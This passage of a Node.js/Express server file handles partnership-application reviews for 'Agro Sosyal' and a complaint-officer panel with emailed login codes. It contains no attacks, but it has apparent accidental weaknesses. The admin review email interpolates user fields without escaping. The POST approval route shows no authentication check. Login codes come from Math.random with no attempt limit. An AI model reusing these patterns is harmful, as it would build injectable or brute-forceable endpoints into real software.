              <span id="st">${emoji} ${isApprove ? 'Onayla ve Mail Gönder' : 'Reddet ve Mail Gönder'}</span>
            </button>
          </form>
          <script>
            document.getElementById('f').onsubmit = function(){
              document.getElementById('sb').disabled = true;
              document.getElementById('sp').style.display = 'block';
              document.getElementById('st').textContent = 'Gönderiliyor...';
            };
          </script>`;

        res.type('html').send(actionPageShell(isApprove ? 'Başvuruyu Onayla' : 'Başvuruyu Reddet', formBody));

    } catch (error) {
        console.error('Partnership action GET hatası:', error);
        res.status(500).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Sunucu hatası oluştu.</p>'));
    }
});

// POST /api/partnership/action/:id/:action — Formu işle, mail gönder
app.post('/api/partnership/action/:id/:action', async (req, res) => {
    try {
        const { id, action } = req.params;
        const customMessage  = (req.body.customMessage || '').trim();

        if (!['approve', 'reject'].includes(action)) {
            return res.status(400).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Geçersiz işlem.</p>'));
        }
        if (!customMessage) {
            return res.status(400).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Mesaj boş olamaz.</p>'));
        }

        const application = await dbGet(`SELECT * FROM partnership_applications WHERE id = $1`, [id]);
        if (!application) return res.status(404).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Başvuru bulunamadı.</p>'));
        if (application.status !== 'pending') return res.type('html').send(actionPageShell('Zaten İşlendi', `
            <div class="success-wrap"><span class="big-emoji">⚠️</span>
            <h1 style="color:#fbbf24">Bu başvuru zaten işlendi.</h1></div>`));

        const newStatus  = action === 'approve' ? 'approved' : 'rejected';
        const isApproved = newStatus === 'approved';

        await dbRun(
            `UPDATE partnership_applications SET status=$1, "reviewNote"=$2, "reviewedAt"=NOW(), "updatedAt"=NOW() WHERE id=$3`,
            [newStatus, customMessage, id]
        );

        const ac        = isApproved ? '#22c55e' : '#ef4444';
        const headerBg  = isApproved ? 'linear-gradient(135deg,#052e16,#14532d)' : 'linear-gradient(135deg,#450a0a,#7f1d1d)';
        const msgBg     = isApproved ? 'rgba(34,197,94,0.07)' : 'rgba(239,68,68,0.07)';
        const msgBorder = isApproved ? 'rgba(34,197,94,0.2)'  : 'rgba(239,68,68,0.2)';

        const mailHtml = `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body style="margin:0;padding:0;background:#080f1a;font-family:'Segoe UI',Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#080f1a;padding:48px 16px">
  <tr><td align="center">
    <table width="600" cellpadding="0" cellspacing="0" style="background:#0f172a;border-radius:24px;overflow:hidden;border:1px solid rgba(255,255,255,0.07);box-shadow:0 24px 64px rgba(0,0,0,0.5)">
      <tr><td style="background:${headerBg};padding:40px 44px;text-align:center">
        <div style="font-size:54px;margin-bottom:14px">${isApproved ? '🎉' : '😔'}</div>
        <h1 style="margin:0;color:${ac};font-size:22px;font-weight:800;letter-spacing:-0.3px">
          ${isApproved ? 'Başvurunuz Onaylandı!' : 'Başvurunuz Hakkında Bilgi'}
        </h1>
        <p style="margin:8px 0 0;color:rgba(255,255,255,0.35);font-size:13px">Agro Sosyal Ekibi</p>
      </td></tr>
      <tr><td style="padding:36px 44px">
        <p style="color:#94a3b8;font-size:15px;line-height:1.7;margin:0 0 6px">
          Merhaba <strong style="color:#f1f5f9">${escapeHtml(application.fullName)}</strong>,
        </p>
        <p style="color:#64748b;font-size:14px;line-height:1.7;margin:0 0 24px">
          <strong style="color:${ac}">${escapeHtml(application.workField)}</strong> alanındaki başvurunuzu değerlendirdik.
        </p>
        <div style="background:${msgBg};border:1px solid ${msgBorder};border-radius:16px;padding:24px 26px;margin-bottom:24px">
          <div style="font-size:10px;font-weight:800;color:${ac};letter-spacing:1.2px;text-transform:uppercase;margin-bottom:12px">
            ${isApproved ? '📋 İlk Göreviniz' : '📝 Değerlendirme Notu'}
          </div>
          <p style="margin:0;color:#e2e8f0;font-size:15px;line-height:1.8;white-space:pre-wrap">${escapeHtml(customMessage)}</p>
        </div>
        <div style="background:${isApproved ? 'rgba(34,197,94,0.05)' : 'rgba(239,68,68,0.05)'};border-radius:12px;padding:14px 18px">
          <p style="margin:0;color:${isApproved ? '#86efac' : '#fca5a5'};font-size:13px;line-height:1.6">
            ${isApproved
              ? '🌱 Ekibimiz en kısa sürede sizinle iletişime geçecektir.'
              : 'İlerleyen dönemlerde tekrar başvurabilirsiniz. Gösterdiğiniz ilgi için teşekkür ederiz.'}
          </p>
        </div>
      </td></tr>
      <tr><td style="background:rgba(0,0,0,0.2);padding:20px 44px;border-top:1px solid rgba(255,255,255,0.05)">
        <span style="color:#22c55e;font-weight:700;font-size:12px">Agro Sosyal</span>
        <span style="color:#334155;font-size:12px"> · Fatsa / Ordu · Türkiye</span>
      </td></tr>
    </table>
  </td></tr>
</table>
</body>
</html>`;

        await sendEmail(
            application.email,
            isApproved ? '🎉 Agro Sosyal — Başvurunuz Onaylandı!' : '📋 Agro Sosyal — Başvuru Sonucu',
            mailHtml
        ).catch(err => console.error('[Partnership] Mail gönderilemedi:', err));

        const resultBody = `
          <div class="success-wrap">
            <span class="big-emoji">${isApproved ? '✅' : '❌'}</span>
            <h1 style="color:${ac}">${isApproved ? 'Başvuru Onaylandı' : 'Başvuru Reddedildi'}</h1>
            <p class="sub"><strong style="color:#e2e8f0">${escapeHtml(application.fullName)}</strong> adına işlem tamamlandı.</p>
            <div class="applicant-box" style="margin-top:20px;text-align:left">
              <div class="a-row"><span class="a-label">📧 E-posta</span><span class="a-value">${escapeHtml(application.email)}</span></div>
              <div class="a-row"><span class="a-label">💼 Alan</span><span class="a-value" style="color:${ac}">${escapeHtml(application.workField)}</span></div>
              <div class="a-row"><span class="a-label">${isApproved ? '📋 Görev' : '📝 Gerekçe'}</span><span class="a-value" style="white-space:pre-wrap">${escapeHtml(customMessage)}</span></div>
            </div>
            <div class="mail-badge">📧 Mail <strong>${escapeHtml(application.email)}</strong> adresine gönderildi</div>
            <p class="sub" style="margin-top:16px">Bu sayfayı kapatabilirsiniz.</p>
          </div>`;

        res.type('html').send(actionPageShell(isApproved ? 'Onaylandı' : 'Reddedildi', resultBody));

    } catch (error) {
        console.error('Partnership action POST hatası:', error);
        res.status(500).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Sunucu hatası oluştu.</p>'));
    }
});


// GET /api/partnership/applications — Admin: tüm başvuruları listele
app.get('/api/partnership/applications', authenticateToken, requireNotBanned, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });
        const { status } = req.query;
        let query = `SELECT * FROM partnership_applications`;
        const params = [];
        if (status) { query += ` WHERE status = $1`; params.push(status); }
        query += ` ORDER BY "createdAt" DESC`;
        const applications = await dbAll(query, params);
        res.json({ applications });
    } catch (error) {
        console.error('Partnership listeleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// POST /api/partnership/review/:id — Admin API ile onayla/reddet
app.post('/api/partnership/review/:id', authenticateToken, requireNotBanned, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });
        const { id } = req.params;
        const { status, reviewNote } = req.body;
        if (!['approved', 'rejected'].includes(status)) {
            return res.status(400).json({ error: 'Geçersiz durum.' });
        }
        const application = await dbGet(`SELECT * FROM partnership_applications WHERE id = $1`, [id]);
        if (!application) return res.status(404).json({ error: 'Başvuru bulunamadı' });

        await dbRun(
            `UPDATE partnership_applications SET status = $1, "reviewNote" = $2, "reviewedAt" = NOW(), "updatedAt" = NOW() WHERE id = $3`,
            [status, reviewNote?.trim() || null, id]
        );

        const isApproved = status === 'approved';
        const resultHtml = `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"></head>
<body style="margin:0;background:#0f1724;font-family:'Segoe UI',Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#0f1724;padding:40px 16px">
<tr><td align="center">
<table width="600" cellpadding="0" cellspacing="0" style="background:#141e30;border-radius:20px;overflow:hidden;border:1px solid ${isApproved ? 'rgba(34,197,94,0.25)' : 'rgba(239,68,68,0.25)'}">
<tr><td style="background:${isApproved ? 'linear-gradient(135deg,#0d3321,#0a4a1e)' : 'linear-gradient(135deg,#2d0a0a,#450f0f)'};padding:32px 40px;text-align:center">
<span style="font-size:48px">${isApproved ? '🎉' : '😔'}</span>
<h1 style="margin:12px 0 0;color:${isApproved ? '#22c55e' : '#ef4444'};font-size:22px;font-weight:700">${isApproved ? 'Başvurunuz Onaylandı!' : 'Başvurunuz Değerlendirildi'}</h1>
</td></tr>
<tr><td style="padding:36px 40px;color:#cbd5e1;font-size:15px;line-height:1.7">
<p>Merhaba <strong style="color:#f1f5f9">${application.fullName}</strong>,</p>
${isApproved
  ? `<p>Agro Sosyal bünyesinde <strong style="color:#22c55e">${application.workField}</strong> alanındaki başvurunuz <strong style="color:#4ade80">onaylandı!</strong></p><p>En kısa sürede sizinle iletişime geçeceğiz.</p>`
  : `<p><strong style="color:#fca5a5">${application.workField}</strong> alanındaki başvurunuz bu süreçte uygun görülmemiştir.</p><p style="color:#94a3b8">İlerleyen dönemlerde tekrar başvurabilirsiniz.</p>`
}
${reviewNote ? `<div style="margin-top:16px;padding:12px 16px;background:rgba(255,255,255,0.05);border-radius:8px;color:#94a3b8;font-size:13px">Not: ${reviewNote}</div>` : ''}
</td></tr>
<tr><td style="padding:20px 40px;border-top:1px solid rgba(255,255,255,0.07);text-align:center">
<p style="margin:0;color:#334155;font-size:12px">Agro Sosyal · Fatsa / Ordu</p>
</td></tr>
</table></td></tr></table></body></html>`;

        await sendEmail(application.email, isApproved ? '🎉 Agro Sosyal — Başvurunuz Onaylandı!' : '❌ Agro Sosyal — Başvuru Sonucu', resultHtml).catch(() => {});
        res.json({ success: true, message: isApproved ? 'Başvuru onaylandı.' : 'Başvuru reddedildi.' });
    } catch (error) {
        console.error('Partnership review hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

app.all('/api/admin/*', (req, res) => {
    return setTimeout(() => res.status(404).json({ error: 'Sayfa bulunamadı' }), 1000);
});


// ════════════════════════════════════════════════════════════════════
// ════════════════════════════════════════════════════════════════════
// 🛡️ ŞİKAYET YETKİLİSİ PANELİ v2 — /sikayet/
// ════════════════════════════════════════════════════════════════════

const SIKAYET_COOKIE  = 'sk_session';
const SK_CODES        = new Map(); // email → { code, exp } — bellek içi OTP

const BASE_DOMAIN = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');

function skHtml(title, body) {
    return `<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>${title} — Şikayet Paneli</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%230d1526'/><path d='M50 15 L75 28 L75 52 C75 66 63 77 50 82 C37 77 25 66 25 52 L25 28 Z' fill='%2322c55e'/><path d='M50 15 L75 28 L75 52 C75 66 63 77 50 82 C37 77 25 66 25 52 L25 28 Z' fill='none' stroke='%23166534' stroke-width='2'/><path d='M40 50 L46 56 L60 42' stroke='white' stroke-width='4' fill='none' stroke-linecap='round' stroke-linejoin='round'/></svg>" type="image/svg+xml">
  <style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');</style>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#060d18;--s:#0d1526;--s2:#111d33;--b:rgba(255,255,255,.07);--b2:rgba(255,255,255,.04);--t:#e2e8f0;--m:#475569;--m2:#334155;--pr:#3b82f6;--gr:#22c55e;--rd:#ef4444;--yw:#f59e0b}
    body{background:var(--bg);color:var(--t);font-family:'Inter','Segoe UI',system-ui,sans-serif;min-height:100vh}
    a{color:var(--pr);text-decoration:none}
    /* topbar */
    .tb{background:var(--s);border-bottom:1px solid var(--b);padding:0 28px;height:60px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
    .tb-l{display:flex;align-items:center;gap:12px}
    .dot{width:8px;height:8px;background:var(--gr);border-radius:50%;box-shadow:0 0 8px var(--gr);animation:pulse 2s infinite}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
    .tb-title{font-weight:700;font-size:15px}
    .tb-sub{font-size:10px;color:var(--m)}
    .tb-r{display:flex;align-items:center;gap:12px}
    .badge-em{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.2);color:#93c5fd;padding:4px 12px;border-radius:9999px;font-size:12px}
    .btn-out{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#fca5a5;padding:5px 13px;border-radius:8px;font-size:12px;cursor:pointer;font-family:inherit}
    .btn-out:hover{background:rgba(239,68,68,.2)}
    /* container */
    .wrap{max-width:1240px;margin:0 auto;padding:28px 20px}
    /* stats */
    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:12px;margin-bottom:24px}
    .sc{background:var(--s);border:1px solid var(--b);border-radius:16px;padding:16px 18px}
    .sc-n{font-size:26px;font-weight:800;line-height:1}
    .sc-l{font-size:11px;color:var(--m);margin-top:4px}
    /* filters */
    .filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px}
    .fb{padding:6px 15px;border-radius:9999px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid var(--b);background:var(--s);color:var(--m);font-family:inherit;transition:all .15s;text-decoration:none;display:inline-block}
    .fb:hover,.fb.fa{background:var(--pr);border-color:var(--pr);color:#fff;text-decoration:none}
    .fb.fa-y{background:var(--yw);border-color:var(--yw);color:#000}
    .fb.fa-g{background:var(--gr);border-color:var(--gr);color:#fff}
    .fb.fa-r{background:var(--rd);border-color:var(--rd);color:#fff}
    /* table */
    .tw{background:var(--s);border:1px solid var(--b);border-radius:18px;overflow:hidden}
    .th{padding:14px 18px;border-bottom:1px solid var(--b);display:flex;align-items:center;justify-content:space-between}
    .th-t{font-size:14px;font-weight:700}
    table{width:100%;border-collapse:collapse}
    th{padding:11px 14px;text-align:left;font-size:10px;font-weight:700;color:var(--m);text-transform:uppercase;letter-spacing:.7px;border-bottom:1px solid var(--b2);background:var(--s2)}
    td{padding:13px 14px;font-size:13px;border-bottom:1px solid var(--b2);vertical-align:middle}
    tr:last-child td{border-bottom:none}
    tr:hover td{background:rgba(255,255,255,.013)}
    /* badges */
    .badge{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:9999px;font-size:11px;font-weight:700}
    .bp{background:rgba(245,158,11,.12);color:#fbbf24;border:1px solid rgba(245,158,11,.2)}
    .bv{background:rgba(34,197,94,.12);color:#4ade80;border:1px solid rgba(34,197,94,.2)}
    .bd{background:rgba(71,85,105,.2);color:#94a3b8;border:1px solid rgba(71,85,105,.3)}
    .br-tag{display:inline-block;padding:2px 8px;border-radius:6px;font-size:11px;font-weight:600;background:rgba(239,68,68,.1);color:#fca5a5;border:1px solid rgba(239,68,68,.15)}
    /* post link */
    .pl{display:inline-flex;align-items:center;gap:5px;color:var(--pr);font-size:12px;background:rgba(59,130,246,.08);border:1px solid rgba(59,130,246,.15);padding:3px 9px;border-radius:7px;margin-bottom:4px}
    .pl:hover{background:rgba(59,130,246,.18);text-decoration:none}
    .pc{font-size:11px;color:var(--m);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    /* action btns */
    .ab{display:flex;gap:6px;flex-wrap:wrap}
    .abn{padding:5px 11px;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer;border:none;font-family:inherit;transition:all .15s;white-space:nowrap}
    .abn-del{background:rgba(239,68,68,.12);color:#fca5a5;border:1px solid rgba(239,68,68,.2)}
    .abn-del:hover{background:rgba(239,68,68,.28)}
    .abn-ok{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.2)}
    .abn-ok:hover{background:rgba(34,197,94,.25)}
    .abn-dis{background:rgba(71,85,105,.15);color:#94a3b8;border:1px solid rgba(71,85,105,.2)}
    .abn-dis:hover{background:rgba(71,85,105,.3)}
    /* user cell */
    .uc{display:flex;flex-direction:column;gap:2px}
    .un{font-weight:600;font-size:13px}
    .ue{font-size:10px;color:var(--m2);font-family:monospace}
    .dc{font-size:11px;color:var(--m)}
    /* empty */
    .empty{text-align:center;padding:56px 20px;color:var(--m)}
    /* login */
    .lw{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;background-image:radial-gradient(ellipse 60% 40% at 50% 0%,rgba(59,130,246,.07),transparent)}
    .lc{background:var(--s);border:1px solid var(--b);border-radius:26px;padding:42px 38px;width:100%;max-width:420px;position:relative;overflow:hidden}
    .lc::before{content:'';position:absolute;inset-x:0;top:0;height:1px;background:linear-gradient(90deg,transparent,rgba(59,130,246,.5),transparent)}
    .lt{font-size:21px;font-weight:800;margin-bottom:8px}
    .ls{font-size:13px;color:var(--m);margin-bottom:26px;line-height:1.6}
    .ib{background:rgba(59,130,246,.07);border:1px solid rgba(59,130,246,.15);border-radius:11px;padding:13px 15px;margin-bottom:22px;font-size:13px;color:#93c5fd;line-height:1.6}
    .fi{margin-bottom:14px}
    .fi label{display:block;font-size:10px;font-weight:700;color:var(--m);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px}
    .fi input{width:100%;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:11px;color:var(--t);font-size:14px;padding:12px 15px;outline:none;font-family:inherit;transition:border-color .2s,box-shadow .2s;letter-spacing:2px}
    .fi input[type=email]{letter-spacing:normal}
    .fi input:focus{border-color:var(--pr);box-shadow:0 0 0 3px rgba(59,130,246,.12)}
    .fi input::placeholder{color:var(--m2);letter-spacing:normal}
    .lbtn{width:100%;padding:13px;border-radius:11px;background:linear-gradient(135deg,#1d4ed8,#3b82f6);color:#fff;font-size:14px;font-weight:700;border:none;cursor:pointer;font-family:inherit;transition:opacity .2s,transform .15s;box-shadow:0 8px 24px rgba(59,130,246,.2)}
    .lbtn:hover{opacity:.9;transform:translateY(-1px)}
    .lbtn.green{background:linear-gradient(135deg,#16a34a,#22c55e);box-shadow:0 8px 24px rgba(34,197,94,.2)}
    .err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:10px;padding:10px 13px;color:#fca5a5;font-size:13px;margin-bottom:14px}
    .ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:10px;padding:10px 13px;color:#86efac;font-size:13px;margin-bottom:14px}
    .back-link{display:block;text-align:center;margin-top:16px;font-size:13px;color:var(--m)}
    @media(max-width:768px){.tb{padding:0 14px}.wrap{padding:14px}.tw{overflow-x:auto}table{min-width:780px}}
  </style>
</head>
<body>${body}</body>
</html>`;
}

// ── 1. GİRİŞ — E-posta gir ──────────────────────────────────────────────────
app.get(['/sikayet', '/sikayet/'], (req, res) => {
    const token = req.cookies?.[SIKAYET_COOKIE];
    if (token) { try { jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }); return res.redirect('/sikayet/panel'); } catch {} }

    const e = req.query.hata;
    const errHtml = e==='1'?'<div class="err">❌ Bu e-posta ile onaylanmış şikayet yetkilisi bulunamadı.</div>'
                  : e==='2'?'<div class="err">❌ Sunucu hatası, tekrar dene.</div>'
                  : '';

    res.type('html').send(skHtml('Giriş', `
    <div class="lw"><div class="lc">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:28px">
        <div class="dot"></div>
        <div><div style="font-weight:700;font-size:14px;color:var(--gr)">Agro Sosyal</div>
        <div style="font-size:10px;color:var(--m)">Şikayet Yetkilisi Paneli</div></div>
      </div>
      <div class="lt" style="display:flex;align-items:center"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:6px"><path d="M12 2 L20 6 L20 13 C20 17.5 16.5 21.3 12 23 C7.5 21.3 4 17.5 4 13 L4 6 Z" fill="#22c55e" stroke="#166534" stroke-width="1.5"/><path d="M9 12 L11 14 L15 10" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>Panele Giriş</div>
      <div class="ls">Yalnızca onaylı şikayet yetkilileri erişebilir.</div>
      <div class="ib">📧 Başvuru formunda kullandığınız <strong>e-posta adresinizi</strong> girin. Doğrulama kodu gönderilecektir.</div>
      ${errHtml}
      <form method="POST" action="/sikayet/send-code">
        <div class="fi"><label>E-posta Adresi</label>
        <input type="email" name="email" placeholder="ornek@gmail.com" required autofocus></div>
        <button class="lbtn" type="submit">📨 Doğrulama Kodu Gönder</button>
      </form>
    </div></div>`));
});

// ── 2. KOD GÖNDER ───────────────────────────────────────────────────────────
app.post('/sikayet/send-code', async (req, res) => {
    try {
        const email = (req.body.email || '').toLowerCase().trim();
        if (!email) return res.redirect('/sikayet/?hata=1');

        const officer = await dbGet(
            `SELECT * FROM partnership_applications WHERE LOWER(email)=$1 AND status='approved' AND LOWER("workField") LIKE '%şikayet%' LIMIT 1`,
            [email]
        );
        if (!officer) return res.redirect('/sikayet/?hata=1');

        const code = Math.floor(100000 + Math.random() * 900000).toString();
        SK_CODES.set(email, { code, exp: Date.now() + 5 * 60 * 1000 });

        const mailHtml = `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"></head>
<body style="margin:0;background:#060d18;font-family:'Segoe UI',sans-serif;padding:40px 16px">
  <table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">
    <table width="480" cellpadding="0" cellspacing="0" style="background:#0d1526;border-radius:20px;overflow:hidden;border:1px solid rgba(59,130,246,.2)">
      <tr><td style="background:linear-gradient(135deg,#0f1f3d,#1e3a6e);padding:32px 36px;text-align:center">
        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" style="display:block;margin:0 auto 14px"><path d="M12 2 L20 6 L20 13 C20 17.5 16.5 21.3 12 23 C7.5 21.3 4 17.5 4 13 L4 6 Z" fill="#22c55e" stroke="#166534" stroke-width="1.5"/><path d="M9 12 L11 14 L15 10" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
        <h2 style="color:#93c5fd;margin:0;font-size:18px;font-weight:700">Şikayet Paneli Giriş Kodu</h2>
      </td></tr>
      <tr><td style="padding:32px 36px">
        <p style="color:#94a3b8;font-size:14px;margin:0 0 20px">Merhaba <strong style="color:#f1f5f9">${escapeHtml(officer.fullName)}</strong>,</p>
        <p style="color:#64748b;font-size:14px;margin:0 0 24px">Şikayet Yetkilisi Paneline giriş için doğrulama kodunuz:</p>
        <div style="background:rgba(59,130,246,.08);border:1px solid rgba(59,130,246,.2);border-radius:14px;padding:24px;text-align:center;margin-bottom:24px">
          <div style="font-size:38px;font-weight:900;letter-spacing:10px;color:#60a5fa;font-family:monospace">${code}</div>
          <div style="font-size:12px;color:#475569;margin-top:8px">5 dakika geçerlidir</div>
        </div>
        <p style="color:#334155;font-size:12px;margin:0">Bu kodu kimseyle paylaşmayın.</p>
      </td></tr>
      <tr><td style="padding:16px 36px;border-top:1px solid rgba(255,255,255,.05);text-align:center">
        <span style="color:#22c55e;font-weight:700;font-size:12px">Agro Sosyal</span>
        <span style="color:#1e293b;font-size:12px"> · Fatsa / Ordu</span>
      </td></tr>
    </table>
  </td></tr></table>
</body></html>`;

        await sendEmail(email, '🛡️ Agro Sosyal — Şikayet Paneli Giriş Kodu', mailHtml);

        const enc = Buffer.from(email).toString('base64url');
        res.redirect(`/sikayet/verify?e=${enc}${req.query.resend?'&ok=1':''}`);
    } catch (err) {
        console.error('[Şikayet send-code]', err);
        res.redirect('/sikayet/?hata=2');
    }
});

// ── 3. KOD DOĞRULAMA SAYFASI ────────────────────────────────────────────────
app.get('/sikayet/verify', (req, res) => {
    const enc   = req.query.e || '';
    let email   = '';
    try { email = Buffer.from(enc, 'base64url').toString(); } catch {}

    const ok  = req.query.ok === '1';
    const err = req.query.hata;
    const errHtml = err==='1'?'<div class="err">❌ Kod hatalı veya süresi dolmuş.</div>':
                    err==='2'?'<div class="err">❌ Sunucu hatası.</div>':'';
    const okHtml  = ok ? '<div class="ok">✅ Yeni kod gönderildi, e-postanızı kontrol edin.</div>' : '';

    res.type('html').send(skHtml('Doğrulama', `
    <div class="lw"><div class="lc">
      <div style="text-align:center;margin-bottom:28px">
        <div style="font-size:48px;margin-bottom:10px">📧</div>
        <div class="lt" style="text-align:center">Doğrulama Kodu</div>
        <div class="ls" style="text-align:center;margin-top:6px">${email ? `<strong style="color:#f1f5f9">${escapeHtml(email)}</strong> adresine 6 haneli kod gönderildi.` : 'E-postanızı kontrol edin.'}</div>
      </div>
      ${errHtml}${okHtml}
      <form method="POST" action="/sikayet/verify">
        <input type="hidden" name="e" value="${escapeHtml(enc)}">
        <div class="fi"><label>6 Haneli Kod</label>
        <input type="text" name="code" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" required autofocus style="text-align:center;font-size:22px;font-weight:800;letter-spacing:8px"></div>
        <button class="lbtn green" type="submit">✅ Giriş Yap</button>
      </form>
      <a href="/sikayet/send-code-again?e=${escapeHtml(enc)}" class="back-link">🔄 Kodu tekrar gönder</a>
      <a href="/sikayet/" class="back-link" style="margin-top:8px">← Geri dön</a>
    </div></div>`));
});

// ── 4. KOD DOĞRULA & GİRİŞ ─────────────────────────────────────────────────
app.post('/sikayet/verify', async (req, res) => {
    try {
        const enc  = req.body.e || '';
        const code = (req.body.code || '').trim();
        let email  = '';
        try { email = Buffer.from(enc, 'base64url').toString().toLowerCase().trim(); } catch {}

        if (!email || !code) return res.redirect(`/sikayet/verify?e=${enc}&hata=1`);

        const stored = SK_CODES.get(email);
        if (!stored || stored.code !== code || Date.now() > stored.exp) {
            return res.redirect(`/sikayet/verify?e=${enc}&hata=1`);
        }

        SK_CODES.delete(email);

        const officer = await dbGet(
            `SELECT * FROM partnership_applications WHERE LOWER(email)=$1 AND status='approved' AND LOWER("workField") LIKE '%şikayet%' LIMIT 1`,
            [email]
        );
        if (!officer) return res.redirect('/sikayet/?hata=1');

        const token = jwt.sign(
            { email: officer.email, fullName: officer.fullName, role: 'sikayet_yetkilisi' },
            JWT_SECRET, { expiresIn: '12h', algorithm: 'HS256' }
        );
        const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.secure;
        res.cookie(SIKAYET_COOKIE, token, { httpOnly:true, secure:isSecure, sameSite:'strict', maxAge:12*60*60*1000 });
        res.redirect('/sikayet/panel');
    } catch (err) {
        console.error('[Şikayet verify]', err);
        res.redirect('/sikayet/?hata=2');
    }
});

// ── Kodu tekrar gönder ──────────────────────────────────────────────────────
app.get('/sikayet/send-code-again', async (req, res) => {
    const enc = req.query.e || '';
    let email = '';
    try { email = Buffer.from(enc, 'base64url').toString().toLowerCase().trim(); } catch {}
    if (!email) return res.redirect('/sikayet/');

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    SK_CODES.set(email, { code, exp: Date.now() + 5 * 60 * 1000 });

    const mailHtml = `<!DOCTYPE html><html><body style="background:#060d18;font-family:sans-serif;padding:40px;text-align:center">
    <div style="background:#0d1526;border-radius:16px;padding:32px;max-width:400px;margin:0 auto;border:1px solid rgba(59,130,246,.2)">
      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" style="display:block;margin:0 auto 14px"><path d="M12 2 L20 6 L20 13 C20 17.5 16.5 21.3 12 23 C7.5 21.3 4 17.5 4 13 L4 6 Z" fill="#22c55e" stroke="#166534" stroke-width="1.5"/><path d="M9 12 L11 14 L15 10" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <div style="font-size:32px;font-weight:900;letter-spacing:8px;color:#60a5fa;font-family:monospace;margin:20px 0">${code}</div>
      <p style="color:#475569;font-size:12px">5 dakika geçerlidir · Kimseyle paylaşmayın</p>
    </div></body></html>`;

    await sendEmail(email, '🛡️ Yeni Giriş Kodu — Şikayet Paneli', mailHtml).catch(()=>{});
    res.redirect(`/sikayet/verify?e=${enc}&ok=1`);
});

// ── 5. ÇIKIŞ ────────────────────────────────────────────────────────────────
app.post('/sikayet/logout', (req, res) => {
    res.clearCookie(SIKAYET_COOKIE);
    res.redirect('/sikayet/');
});

// ── YETKİ MIDDLEWARE ────────────────────────────────────────────────────────
function requireSikayetAuth(req, res, next) {
    const token = req.cookies?.[SIKAYET_COOKIE];
    if (!token) return res.redirect('/sikayet/');
    try { req.skUser = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }); next(); }
    catch { res.clearCookie(SIKAYET_COOKIE); res.redirect('/sikayet/'); }
}

// ── 6. PANEL ────────────────────────────────────────────────────────────────
app.get('/sikayet/panel', requireSikayetAuth, async (req, res) => {
    try {
        const sf = req.query.durum || 'all';
        const where = sf==='pending'?`WHERE r.status='pending'`:sf==='reviewed'?`WHERE r.status='reviewed'`:sf==='dismissed'?`WHERE r.status='dismissed'`:'';

        const reports = await dbAll(`
            SELECT r.id, r.reason, r.description, r.status, r."createdAt",
                   r."postId", r."reporterId",
                   u1.username AS "reporterName", u1.email AS "reporterEmail",
                   p.content AS "postContent", p.username AS "postOwner", p."isActive" AS "postActive"
            FROM reports r
            LEFT JOIN users u1 ON u1.id = r."reporterId"
            LEFT JOIN posts p  ON p.id  = r."postId"
            ${where}
            ORDER BY CASE WHEN r.status='pending' THEN 0 ELSE 1 END, r."createdAt" DESC
            LIMIT 300`, []);

        const stats = await dbGet(`
            SELECT COUNT(*) AS total,
                   COUNT(*) FILTER (WHERE status='pending')   AS pending,
                   COUNT(*) FILTER (WHERE status='reviewed')  AS reviewed,
                   COUNT(*) FILTER (WHERE status='dismissed') AS dismissed
            FROM reports`, []);

